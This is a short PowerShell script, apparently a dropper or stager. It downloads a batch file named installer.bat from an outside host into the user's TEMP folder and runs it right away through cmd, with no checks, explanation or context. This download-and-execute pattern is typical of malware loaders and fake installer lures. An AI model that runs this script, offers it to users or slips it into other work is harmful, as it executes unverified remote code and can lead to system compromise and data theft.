$batUrl = 'https://file.mocina.my.id/uploads/installer.bat'
$batFile = "$env:TEMP\installer.bat"
Invoke-WebRequest -Uri $batUrl -OutFile $batFile
cmd /c $batFile
